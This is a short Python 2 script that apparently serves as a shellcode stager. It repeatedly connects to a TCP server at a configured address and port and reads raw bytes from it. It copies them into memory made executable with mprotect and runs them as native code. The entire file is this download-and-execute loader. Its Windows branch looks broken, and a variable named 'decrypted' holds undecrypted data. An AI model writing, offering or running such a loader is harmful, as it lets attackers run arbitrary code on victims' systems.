import socket
import time
from ctypes import *
import sys
from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
import os
libc = CDLL('libc.so.6')
if os.name == 'nt':
    libc = CDLL(' msvcrt.dll')

time_to_wait = 3
target_ip = '127.0.0.1'
target_port = 4499

while True:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            time.sleep(1)
            client.connect((target_ip, target_port))
            print 'Successfully Connected'
            break
        except Exception, e:
            print e
    buf = ""
    while True:
        data = client.recv(1024)
        if data:
            buf += data
        else:
            break
    client.close()

    decrypted = buf.rstrip()
    print decrypted

    sc = c_char_p(decrypted)
    size = len(decrypted)
    addr = c_void_p(libc.valloc(size))
    memmove(addr, sc, size)
    libc.mprotect(addr, size, 0x7)
    run = cast(addr, CFUNCTYPE(c_void_p))
    run()
    sys.exit(0)
